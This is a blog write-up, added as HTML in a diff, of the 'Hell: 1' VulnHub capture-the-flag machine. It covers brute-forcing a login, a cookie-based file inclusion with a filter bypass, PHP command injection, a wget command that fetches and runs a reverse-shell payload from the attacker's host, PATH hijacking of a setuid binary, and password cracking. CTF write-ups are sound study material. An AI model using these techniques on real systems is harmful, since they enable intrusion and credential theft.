@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Hell: 1 - Part 1 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-07-15">July 15, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/hell">hell</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Hell: 1 - Part 1</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&rsquo;s a difficult and lengthy challenge will not prepare you for the torture&hellip;</p>
+
+<p>This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&rsquo;t exclude beginners however and I&rsquo;m sure that a few of you could meet the challenge. There is no &lsquo;one&rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!</p>
+
+<h2 id="nmap:1f8081f406d4199da2c905fe029d67c9">Nmap</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.127.102
+ 
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 6.0p1 Debian 4+deb7u1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f4:bb:f4:22:36:08:61:ef:74:2c:27:e0:b4:a2:69:d3 (DSA)
+|   2048 0e:31:1d:cf:04:d0:63:fa:5c:76:f2:dc:22:1c:f1:7c (RSA)
+|_  256 e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa (ECDSA)
+80/tcp    open     http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 2 disallowed entries 
+|_/personal/ /super_secret_login_path_muhahaha/
+|_http-title: Have fun!
+111/tcp   open     rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          35027/udp  status
+|_  100024  1          40080/tcp  status
+666/tcp   open     doom?
+1337/tcp  filtered waste
+40080/tcp open     status  1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          35027/udp  status
+|_  100024  1          40080/tcp  status
+1 service unrecognized despite returning data.
+</code></pre>
+
+<h2 id="apache:1f8081f406d4199da2c905fe029d67c9">Apache</h2>
+
+<p>Popping over to port 80 in a web browser, gives you a page with the following text:</p>
+
+<pre><code class="language-text">Welcome to Hell
+Our admin Jack is still busy coding up the site, but in the mean time - have a comic...
+All credit goes to Cyanide and Happiness at explosm.net.
+Hopefully by the end of the challenge you'll be experiencing one or the other of those things.
+I wonder what's on the gateway to hell? (Port 666 obv)
+</code></pre>
+
+<p>Without going into too much detail, the service on port 666 seemed to be a deadend to me so I continued to enumerate the apache service.</p>
+
+<p>There are two entries in robots.txt:</p>
+
+<pre><code class="language-text">/personal/
+/super_secret_login_path_muhahaha/
+</code></pre>
+
+<p>The <code>personal</code> directory contains a rather&hellip; disturbing show of affection for the founder of VulnHub (and all round good guy), g0tmi1k.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/shrine.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The <code>super_secret</code> directory contains a login page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/login.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I tried a few combinations of <code>admin/jack</code> and <code>g0tmi1k</code>, but was unsuccessful.  There is no SQLi that I was able to find either.</p>
+
+<p>Peleus hints on the VulnHub desription for the challenge, that some techniques required to root this VM can be found on his <a href="http://netsec.ws">own blog</a>.  He has a good post regarding wordlists, which includes using custom word mangling rules for john.</p>
+
+<p>I used the information to create a new mangled password list based on <code>g0tmi1k</code> and ran it again through <code>hydra</code>.  This time I got a hit.</p>
+
+<pre><code class="language-text">root@kali:~/hell# hydra 192.168.127.128 http-form-post &quot;/super_secret_login_path_muhahaha/login.php:username=^USER^ password=^PASS^ mysubmit=Login:Failed&quot; -l jack -P wordlist-mangled
+ 
+[80][www-form] host: 192.168.127.128   login: jack   password: g0tmi1k69
+</code></pre>
+
+<p>Hmm&hellip; 69, this just gets weirder and weirder&hellip;</p>
+
+<p>On the otherside of this login there are image links which take you to a bunch of different pages (some with amusing GIFs).</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/folders.png"  />
+    
+    
+</figure>
+</div>
+
+<p>The Personal Folder links you to another login page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/personal.png"  />
+    
+    
+</figure>
+</div>
+
+<p>When you try an incorrect login you get a countdown.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/failcount.png"  />
+    
+    
+</figure>
+</div>
+
+<p>And when you reach 3 failed attempts, a large intruder alert message appears and you can no longer access any of the pages.  You must clear your cookies to try again.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/intruder.png"  />
+    
+    
+</figure>
+</div>
+
+<p>These two aspects are tracked with cookies: <code>failcount=3; intruder=1;</code></p>
+
+<p>There is also the <code>Notes</code> page, which appears to write any input to a file called <code>note.txt</code>.  Infering from the text on the page, we can assume its being stored in <code>/tmp/note.txt</code>.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/hell-1/notes.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Believe me&hellip; I&rsquo;m going somewhere with all this&hellip;</p>
+
+<p>Carrying out some filename bruteforcing in the <code>super_secret</code> directory, reveals that the HTML for the Intruder message is within a file called <code>1</code>.  So the <code>intruder=1;</code> cookie is actually calling a file.  You can verify this by modying the cookie to include a different file, e.g. <code>index.php</code>.</p>
+
+<p>Also, the <code>failcount=;</code> cookie is unsanitised, so you can modify this to be any value.  Putting all this together, we have some handy php injection!</p>
+
+<h2 id="lfi-php-injection:1f8081f406d4199da2c905fe029d67c9">LFI, PHP Injection</h2>
+
+<p>First, I injected the following PHP code into <code>/tmp/note.txt</code>, via <code>notes.php</code>:
+<code>&lt;?php passthru($_COOKIE['failcount']); ?&gt;</code>.</p>
+
+<p>This will take the input from the failcount cookie and execute it with the php passthru function.</p>
+
+<p>I then refreshed <code>panel.php</code> and modified the cookies accordingly.  Note that there is some filtering on the intruder cookie - it seems to remove instances of <code>../</code>, which obviously made including <code>/tmp/note.txt</code> difficult as you can&rsquo;t use absolute paths either.  There are a couple of ways around this - mine was to do <code>..././</code>.  The filter removes the instance of <code>../</code> in the middle but the characters on either side just come together to form a new <code>../</code>.  The filtering does not loop which allows this to work.  The same thing can be accomplished using <code>...//</code> and so on&hellip;</p>
+
+<p>So:</p>
+
+<pre><code class="language-text">GET /super_secret_login_path_muhahaha/panel.php
+Cookie: 1405281617=; failcount=id; intruder=..././..././..././tmp/note.txt; PHPSESSID=u01geguamj2jakpin0vlm2peb4
+ 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>I was then able to use this code execution to upload and execute a reverse shell (msfpayload).</p>
+
+<pre><code class="language-text">wget%20http%3A%2F%2F192.168.127.127%2Fshell%20-O%20%2Ftmp%2Fshell%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fshell%20%26%26%20%2Ftmp%2Fshell
+</code></pre>
+
+<h2 id="jack:1f8081f406d4199da2c905fe029d67c9">Jack</h2>
+
+<p>With shell access as <code>www-data</code>, I was able to read the <code>login.php</code> file in the <code>super_secret</code> directory.</p>
+
+<pre><code class="language-text">// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;);
+I'll change this back once development is done. Got sick of typing my password.
+mysql_connect(&quot;127.0.0.1&quot;, &quot;www-data&quot;, &quot;website&quot;) or die(&quot;Server Error&quot;);
+</code></pre>
+
+<p>You can log into the MySQL DB with the <code>www-data</code> credentials, but there&rsquo;s nothing more to see.  The commented out password can be used to SSH into Hell as Jack.</p>
+
+<p>Within his home directory is a folder called <code>g0tmi1k_pics</code> containing yet more disturbing pictures, but there&rsquo;s nothing hidden in the images as far as I can tell.</p>
+
+<p>There is also a hidden directory called <code>.pgp</code>.</p>
+
+<pre><code class="language-text">-rwx------ 1 jack jack   39 Jun 18 12:35 note
+-rwx------ 1 jack jack 1802 Jun 18 12:20 pgp.priv
+-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
+ 
+jack@hell:~$ cat .pgp/note
+The usual password as with everything.
+</code></pre>
+
+<p>After some enumeration I found the following file, a PGP encrypted email.</p>
+
+<pre><code class="language-text">jack@hell:~$ file /var/mail/jack/received/message.eml
+/var/mail/jack/received/message.eml: PGP message
+</code></pre>
+
+<p>Import the key, then decrypt the messge.</p>
+
+<pre><code class="language-text">jack@hell:~/.pgp$ gpg --import pgp.priv
+jack@hell:~/.pgp$ gpg -d /var/mail/jack/received/message.eml 
+
+You need a passphrase to unlock the secret key for
+user: &quot;jack @ cowlovers.com&quot;
+2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
+ 
+Enter passphrase: g0tmi1k69
+ 
+Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed.
+ 
+The password is '4J0WWvL5nS'
+</code></pre>
+
+<h2 id="milk-4-life:1f8081f406d4199da2c905fe029d67c9">milk_4_life</h2>
+
+<p>With SSH access as milk_4_life, some proper work begins.</p>
+
+<p>Within his home directory is a binary file called <code>game</code>, which seems to be a small wrapper around <code>/usr/bin/game.py</code>.  When you run the file, all you see is the message <code>I'm Listening</code>.  <code>Netstat</code> or <code>netcat</code> are not installed, but there are some alternatives that can be used.</p>
+
+<p>Using <code>ss -lp</code>, we can see that it&rsquo;s listening on the <code>loopback</code> on port <code>1337</code> and we can use <code>telnet</code> to interact with it.</p>
+
+<pre><code class="language-text">milk_4_life@hell:~$ telnet 127.0.0.1 1337
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Type 'START' to begin
+ 
+da easy crew
+No... START. S-T-A-R-T
+ 
+START
+Starting...
+ 
+You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
+ 
+Quick what's... 696 x 928?
+</code></pre>
+
+<p>There didn&rsquo;t seem to be any vulnerabilities such as buffer overflows in the inputs, so let&rsquo;s try and beat the game!  This reminded me a little of Chuckles&rsquo; game of single syllable&rsquo;s in Ultima VII&hellip;  Every time you get a correct answer your score goes up, but it&rsquo;s a pretty hefty score to beat in 30 seconds.</p>
+
+<p>Realistically, the only way to win is to write an automated script.  All that&rsquo;s required is to read the input of each question, split it to obtain the two numbers, make the calculation and send the answer back (all on a loop),
+<code>chuckles.py</code>.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+ 
+import socket
+import re
+ 
+target = '127.0.0.1'
+port = 1337
+ 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+s.connect((target, port))
+s.recv(1024)
+s.send('START\n')
+s.recv(1024)
+ 
+while True:
+ 
+        data = s.recv(1024)
+        line = re.findall(r&quot;Quick what's... (.*?)\?&quot;, data)
+ 
+        if not line:
+ 
+                print data
+                break
+ 
+        (a,b) = line[0].split(' x ')
+ 
+        mul = int(a) * int(b)
+        print str(data)  + str(mul)
+        s.send(str(mul)+'\n')
+ 
+print s.recv(1024)
+s.close()
+</code></pre>
+
+<pre><code class="language-text">milk_4_life@hell:~$ ./chuckles.py 
+[...snip...]
+Final Score: 397261
+!*!*!*!*! Congratulations, new high score (397261) !*!*!*!*!
+ 
+I hear the faint sound of chmodding.......
+</code></pre>
+
+<p>This implies that when you win the game, a file permission is changed.  Unfortunately it&rsquo;s not helpful enough to tell us which one.  It&rsquo;s logical to assume that because the owner of game is <code>george</code>, then any modification it makes must also be to a file owned by george.</p>
+
+<pre><code class="language-text">milk_4_life@hell:~$ find / -user george 2&gt;/dev/null 
+/home/milk_4_life/game
+/home/george
+/usr/bin/game.py
+/usr/bin/lesson101
+/var/mail/george
+/var/mail/george/signup.eml
+
+---x--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101          &lt;-- before
+---s--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101          &lt;-- after
+</code></pre>
+
+<p>My brief investigation into this binary showed that there may a buffer overflow in the <code>Name</code> field (after you correctly guess the numer in fewer than 3 guesses).  However, I was able to gain access as george through a slightly different route.  The game binary executes a <code>chmod</code> on <code>lesson101</code>, but on a hunch I hoped that the chmod path was not hardcoded in the binary (this was described as a bug in v1 of Hades).</p>
+
+<p>I wrote a simple C program that would run an instance of <code>/bin/sh</code>, compiled it into a binary called <code>chmod</code> and placed it in <code>/tmp</code>.  Then place <code>/tmp</code> at the beginning of the environmental path variable and play the game.  The binary (with it&rsquo;s suid bit) executes <code>/tmp/chmod</code> and gives you a shell as George.</p>
+
+<pre><code class="language-c">chmod.c
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main()
+{
+        system(&quot;/bin/sh -i&quot;);
+}
+</code></pre>
+
+<pre><code class="language-text">milk_4_life@hell:/tmp$ gcc chmod.c -o chmod
+milk_4_life@hell:/tmp$ PATH=/tmp:$PATH
+milk_4_life@hell:~$ ./game
+ 
+I'm listening
+$ id
+uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
+</code></pre>
+
+<h2 id="george:1f8081f406d4199da2c905fe029d67c9">George</h2>
+
+<p>This allows you to enter George&rsquo;s home directory.  To give myself persistent access, I created a <code>.ssh</code> directory and echo&rsquo;d my public SSH key into <code>authorized_keys</code> - this allows me to SSH in as George, without a password.
+George does have an email (which is readable before now), but contains an interesting reference to the <code>rockyou</code> wordlist.</p>
+
+<pre><code class="language-text">-rw-r--r-- 1 george george 175 Jun 20 13:06 /var/mail/george/signup.eml
+ 
+From: admin @ rockyou.com
+</code></pre>
+
+<p>Within his home area is a file called <code>container.rc</code>.</p>
+
+<pre><code class="language-text">-rw------- 1 george george 4194304 Jun 19 21:09 container.tc
+</code></pre>
+
+<p>The TC file extension indicates that this is a TrueCrypt encrypted disk - this can be easily decrypted using the NSA backdoor (joke, but probably true :s).  I transfered the container to my Windows host, where I have <code>cudaHashcat</code> working, and ran it against the rockyou wordlist.  The correct password was found in about 27 seconds.</p>
+
+<pre><code class="language-text">cudaHashcat64.exe -m 6211 conntainer.tc rockyou.txt
+letsyouupdateyourfunnotesandmore
+</code></pre>
+
+<p>With this, the container can be decrypted and mounted.</p>
+
+<pre><code class="language-text">george@hell:~$ truecrypt container.tc
+Enter mount directory [default]: /mnt/truecrypt
+Enter password for /home/george/container.tc:
+Enter keyfile [none]:
+Protect hidden volume (if any)? (y=Yes/n=No) [No]:
+ 
+george@hell:~$ ls -l /mnt/truecrypt/
+-rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
